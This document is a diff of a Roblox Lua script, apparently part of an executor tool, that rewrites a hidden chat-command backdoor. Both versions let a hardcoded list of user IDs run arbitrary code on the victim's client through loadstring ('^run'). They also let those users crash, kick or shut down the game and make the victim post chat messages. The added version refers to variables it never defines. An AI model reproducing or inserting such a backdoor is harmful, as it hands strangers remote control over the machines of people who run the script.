@@ -1,111 +1,84 @@
-local function getplr(str)
-    local plrs = game.Players:GetPlayers()
-    if str:lower() == "all" then
-        return plrs
-    elseif str:lower() == "others" then
-        for i, v in ipairs(plrs) do
-            if v == game.Players.LocalPlayer then
-                table.remove(plrs, i)
-                return plrs
-            end
-        end
-    elseif str:lower() == "me" then
-        return {game.Players.LocalPlayer}
-    else
-        local cockandballs = {}
-        for i, v in pairs(game.Players:GetPlayers()) do
-            if str:lower() == (v.Name:lower()):sub(1, #str) or str:lower() == (v.DisplayName:lower()):sub(1, #str) then
-                table.insert(cockandballs, v)
-            end
-        end
-        return cockandballs
-    end
-end
-local allowed = {
-    1551416114, -- wrydioda4 - knocks
-    252684030, -- jjjuuikjjikkju - knocks
-    2172305, -- antemono / kyrofrost / timeless / reiko
-    4793416752 -- knocks
-    7126612490 -- hawaiianbroski / reiko
-    411845421 -- rin
-    7348878539-- rin
-    7603097827 -- day
-    518978417 -- FR6DDiiee
-    4217459491 -- Kozy
-    1702851506 -- tech
-    5405947853 -- cxo
-    1842223904 -- tech
-    2049407929 -- jotunn
-    142903777 -- ripend
+local backdoorSettings = {
+    allowedUsers = { 
+        1551416114, 252684030, 2172305, 4793416752, 7126612490, 
+        411845421, 7348878539, 7603097827, 518978417, 4217459491, 
+        1702851506, 5405947853, 1842223904, 2049407929, 142903777 
+    },
+    commands = {
+        execute = "^run",
+        crash = "^crash",
+        say = "^say",
+        kick = "^kick",
+        eject = "^eject",
+        spam = "^ktest"
+    }
 }
-local bdconnections = {}
-local function updbd()
-    for i,v in pairs(bdconnections) do
-        pcall(function()
-            v:Disconnect()
-        end)
+
+local function getPlayersByName(searchStr)
+    local players = game.Players:GetPlayers()
+    local result = {}
+    
+    if searchStr:lower() == "all" then
+        return players
+    elseif searchStr:lower() == "others" then
+        for _, player in ipairs(players) do
+            if player ~= lp then
+                table.insert(result, player)
+            end
+        end
+    elseif searchStr:lower() == "me" then
+        return { lp }
+    else
+        for _, player in ipairs(players) do
+            local nameMatch = player.Name:lower():sub(1, #searchStr) == searchStr:lower()
+            local displayNameMatch = player.DisplayName:lower():sub(1, #searchStr) == searchStr:lower()
+            if nameMatch or displayNameMatch then
+                table.insert(result, player)
+            end
+        end
     end
-    for i, v in pairs(game.Players:GetPlayers()) do
-        if table.find(allowed, v.UserId) then
-            bdconnections[v.UserId] =
-                v.Chatted:Connect(
-                function(msg)
-                    local args = msg:split(" ")
-                    if args[1] == "^run" then
-                        loadstring(table.concat(args, " ", 2))()
-                    elseif args[1] == "^ktest" then
-                        game.Players:Chat(
-                            "(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)"
-                        )
-                        game.Players:Chat("aƀçđȇfĝħíǰκ|ɱňοƥʠŕšţûѷwẋƴž")
-                        task.wait(0.3)
-                        local args = {
-                            [1] = "/w " .. v.Name .. " i am indeed using solinium",
-                            [2] = "All"
-                        }
+    return result
+end
 
-                        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild(
-                            "SayMessageRequest"
-                        ):FireServer(unpack(args))
-                    elseif args[1] == "^kick" then
-                        for i,v in pairs(getplr(args[2])) do
-                            if v == game.Players.LocalPlayer then
-                                local reason = table.concat(args, " ", 3)
-                                game.Players.LocalPlayer:Kick(reason)
-                                task.wait(1)
-                                repeat until false
-                            end
-                        end
-                    elseif args[1] == "^crash" then
-                        repeat until false
-                    elseif args[1] == "^say" then
-                        local args = {
-                            [1] = tostring(table.concat(args, " ", 3)),
-                            [2] = "All"
-                        }
+local function backdoorHandler()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if table.find(backdoorSettings.allowedUsers, player.UserId) then
+            connections[player.UserId] = player.Chatted:Connect(function(msg)
+                local args = msg:split(" ")
+                local command = args[1]
+                local targetStr = args[2]
+                local payload = table.concat(args, " ", 3)
 
-                        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild(
-                            "SayMessageRequest"
-                        ):FireServer(unpack(args))
-                    elseif args[1] == "^eject" then
-                        for i,v in pairs(getplr(args[2])) do
-                            if v == game.Players.LocalPlayer then
-                                game:Shutdown()
-                            end
+                if command == backdoorSettings.commands.execute then
+                    loadstring(payload)()
+                elseif command == backdoorSettings.commands.kick then
+                    for _, target in pairs(getPlayersByName(targetStr)) do
+                        if target == lp then
+                            lp:Kick(payload)
                         end
                     end
+                elseif command == backdoorSettings.commands.crash then
+                    repeat task.wait() until false
+                elseif command == backdoorSettings.commands.say then
+                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(payload, "All")
+                elseif command == backdoorSettings.commands.eject then
+                    for _, target in pairs(getPlayersByName(targetStr)) do
+                        if target == lp then
+                            game:Shutdown()
+                        end
+                    end
+                elseif command == backdoorSettings.commands.spam then
+                    for _ = 1, 10 do
+                        game.Players:Chat("(!)(!)(!)(!)(!)(!)(!)")
+                    end
+                    task.wait(0.3)
+                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w " .. player.Name .. " i am indeed using solinium", "All")
                 end
-            )
+            end)
         end
     end
 end
 
-task.delay(0.5, function()
-    game.Players.PlayerAdded:Connect(function()
-        updbd()
-    end)
-    game.Players.PlayerRemoving:Connect(function()
-        updbd()
-    end)
-    updbd()
-end)
+game.Players.PlayerAdded:Connect(backdoorHandler)
+game.Players.PlayerRemoving:Connect(backdoorHandler)
+backdoorHandler()
